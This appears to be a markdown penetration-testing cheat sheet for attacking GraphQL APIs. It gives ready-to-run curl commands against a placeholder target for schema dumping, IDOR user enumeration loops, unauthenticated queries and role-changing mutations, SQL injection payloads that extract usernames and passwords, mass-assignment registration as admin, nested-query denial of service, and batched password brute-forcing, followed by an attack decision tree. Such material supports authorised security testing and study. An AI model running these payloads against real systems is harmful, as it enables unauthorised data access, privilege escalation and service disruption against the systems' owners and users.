# GraphQL Attack Methodology

---

## 1. Detection & Fingerprinting

### Common GraphQL Endpoints
- [ ] Try each of these against the target:
```bash
/graphql
/graphiql
/v1/graphql
/v2/graphql
/api/graphql
/graphql/console
/gql
/query
```

### Detection Methods
```bash
# Send a universal query — if it responds with data, it's GraphQL
curl -s -X POST http://TARGET/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{__typename}"}' | jq

# Expected response: {"data":{"__typename":"Query"}}

# Try GET method
curl -s "http://TARGET/graphql?query=\{__typename\}"

# Check for GraphiQL (interactive IDE — jackpot if open)
curl -s http://TARGET/graphiql
```

---

## 2. Introspection (Schema Dump)

### Full Introspection Query
```bash
curl -s -X POST http://TARGET/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __schema { types { name fields { name type { name kind ofType { name } } } } } }"}' | jq
```

### Detailed Introspection (all types, fields, args)
```bash
curl -s -X POST http://TARGET/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __schema { queryType { name } mutationType { name } types { name kind description fields(includeDeprecated: true) { name description args { name type { name kind ofType { name } } } type { name kind ofType { name } } } } } }"}' | jq
```

### List All Queries
```bash
curl -s -X POST http://TARGET/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __schema { queryType { fields { name description args { name type { name } } } } } }"}' | jq
```

### List All Mutations
```bash
curl -s -X POST http://TARGET/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __schema { mutationType { fields { name description args { name type { name } } } } } }"}' | jq
```

### Tools for Introspection
```bash
# graphw00f — fingerprint the GraphQL engine
pip3 install graphw00f
graphw00f -t http://TARGET/graphql

# InQL Burp extension — auto-introspection + query generator
# Install from BApp Store in Burp Suite

# graphql-voyager — visualize schema (paste introspection JSON)
# https://graphql-kit.com/graphql-voyager/

# clairvoyance — guess schema when introspection is disabled
pip3 install clairvoyance
clairvoyance http://TARGET/graphql -o schema.json
```

---

## 3. Common Attacks

### 3a. Information Disclosure via Introspection
- [ ] Introspection enabled? → dump entire schema
- [ ] Look for sensitive types: `User`, `Admin`, `Password`, `Token`, `Secret`, `Flag`
- [ ] Look for sensitive queries: `allUsers`, `getAdmin`, `dumpDatabase`
- [ ] Look for debug/internal fields: `__debug`, `internal`, `hidden`

### 3b. IDOR — Access Other Users' Data
```bash
# Query your own profile
curl -s -X POST http://TARGET/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ user(id: 1) { id username email role } }"}' | jq

# Change the ID
curl -s -X POST http://TARGET/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ user(id: 2) { id username email role password } }"}' | jq

# Enumerate users
for i in $(seq 1 100); do
  curl -s -X POST http://TARGET/graphql \
    -H "Content-Type: application/json" \
    -d "{\"query\":\"{ user(id: $i) { id username email role } }\"}" | jq -c '.data.user // empty'
done
```

### 3c. Authentication Bypass
```bash
# Try queries without auth headers
curl -s -X POST http://TARGET/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ users { id username email role } }"}' | jq

# Try mutations without auth
curl -s -X POST http://TARGET/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"mutation { updateRole(userId: 1, role: \"admin\") { id role } }"}' | jq
```

### 3d. SQL Injection via GraphQL
```bash
# Inject through string arguments
curl -s -X POST http://TARGET/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ user(username: \"admin\\\" OR 1=1--\") { id username } }"}' | jq

# Through search/filter parameters
curl -s -X POST http://TARGET/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ search(term: \"\\\" UNION SELECT username,password FROM users--\") { title } }"}' | jq
```

### 3e. Privilege Escalation via Mutations
```bash
# Look for role/permission mutations in schema
# Then try:
curl -s -X POST http://TARGET/graphql \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer <YOUR_TOKEN>" \
  -d '{"query":"mutation { updateUser(id: 1, role: \"admin\") { id username role } }"}' | jq

# Mass assignment — add extra fields the mutation might accept
curl -s -X POST http://TARGET/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"mutation { register(username: \"attacker\", password: \"pass\", role: \"admin\") { id role } }"}' | jq
```

### 3f. Denial of Service — Nested Query Attack
```graphql
# Deeply nested query (if no depth limiting)
{
  user(id: 1) {
    friends {
      friends {
        friends {
          friends {
            friends {
              id username
            }
          }
        }
      }
    }
  }
}
```

### 3g. Batching Attack (Brute-Force via Single Request)
```bash
# Send multiple queries in one request to bypass rate limiting
curl -s -X POST http://TARGET/graphql \
  -H "Content-Type: application/json" \
  -d '[
    {"query":"{ login(user:\"admin\", pass:\"password1\") { token } }"},
    {"query":"{ login(user:\"admin\", pass:\"password2\") { token } }"},
    {"query":"{ login(user:\"admin\", pass:\"password3\") { token } }"}
  ]' | jq
```

---

## 4. Introspection Disabled? Bypass Techniques

```bash
# Try alternate introspection paths
curl -s -X POST http://TARGET/graphql \
  -d '{"query":"{__schema{types{name}}}"}' -H "Content-Type: application/json"

# GET method might bypass POST restrictions
curl -s "http://TARGET/graphql?query=\{__schema\{types\{name\}\}\}"

# Try __type instead of __schema
curl -s -X POST http://TARGET/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __type(name: \"User\") { fields { name type { name } } } }"}'

# Field suggestion — send a wrong field, error may leak valid ones
curl -s -X POST http://TARGET/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ xyznonexistent }"}' | jq
# Error: "Did you mean 'user', 'users', 'admin'?"

# clairvoyance — automated wordlist-based schema guessing
clairvoyance http://TARGET/graphql -o schema.json -w /usr/share/seclists/Discovery/Web-Content/graphql-field-names.txt
```

---

## 5. Decision Tree

```
GraphQL Target
├── Find endpoint (/graphql, /gql, /v1/graphql, etc.)
├── Introspection enabled?
│   ├── YES → dump full schema
│   │   ├── Review types → sensitive fields (password, token, flag, secret)
│   │   ├── Review queries → data access (allUsers, getAdmin, search)
│   │   ├── Review mutations → write access (updateRole, deleteUser, register)
│   │   └── Check for debug/internal types
│   └── NO → bypass attempts
│       ├── GET method instead of POST
│       ├── __type queries for known type names
│       ├── Field suggestion via typos
│       └── clairvoyance wordlist guessing
├── Test access controls
│   ├── Query other users' data (IDOR: change id parameter)
│   ├── Run admin queries as low-priv user
│   ├── Run queries with no auth at all
│   └── Try mutations (role change, privilege escalation)
├── Test injection
│   ├── SQLi in string arguments
│   ├── XSS in stored fields (if reflected in frontend)
│   └── OS command injection in resolver arguments
├── Test rate limiting
│   └── Batch queries (array of queries in single request)
└── Test DoS
    └── Nested/recursive queries (depth limit check)
```
